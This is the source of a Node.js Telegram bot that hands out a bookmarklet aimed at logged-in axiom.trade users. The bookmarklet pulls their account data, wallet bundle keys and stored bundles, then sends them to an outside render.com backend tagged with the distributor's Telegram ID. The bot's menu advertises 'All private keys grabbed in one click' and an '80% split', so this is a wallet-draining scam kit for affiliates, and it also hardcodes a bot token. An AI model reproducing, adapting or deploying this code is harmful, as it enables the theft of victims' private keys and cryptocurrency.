const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '8950239346:AAFK2JKNo5NgdcyGLeYAaDFc_M_AY0yDOAg';
const BACKEND_URL = 'https://swizzerrorrsss.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  
  const bookmarklet = `javascript:(async()=>{
    try{
      if(location.hostname!=='axiom.trade'){
        alert('Please navigate to axiom.trade first');
        return;
      }
      if(!localStorage.getItem('isAuthed')){
        return alert('Please log in to axiom.trade first')
      }
      const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
      const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
      const bookmarkData={
        telegramId:'${chatId}',
        site:location.href,
        user:user,
        bundle:bundle.bundleKey,
        sBundles:localStorage.getItem('sBundles'),
        eBundles:localStorage.getItem('eBundles')
      };
      location.replace('${BACKEND_URL}/data/'+btoa(JSON.stringify(bookmarkData)))
    }catch(e){
      alert('Error occurred')
    }
  })();`;

  bot.sendMessage(chatId, `
🎯 **Your Custom Bookmarklet**

📋 **Copy the script below and add it to your html code, if you need help contact support**
\`\`\`
${bookmarklet}
\`\`\`

Your telegram ID: ${chatId}
You'll receive all notifications automatically in this chat.
  `, { parse_mode: 'Markdown' });
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `
🎯 **ZYLOXAS IS 2 FIGS BOT**

Commands:
/generate - Get your custom bookmarklet.
/start - This menu

Compile an axiom bookmark and receive a 80% split. All private keys grabbed in one click.
  `, { parse_mode: 'Markdown' });
});

console.log('Bot started - Backend:', BACKEND_URL);
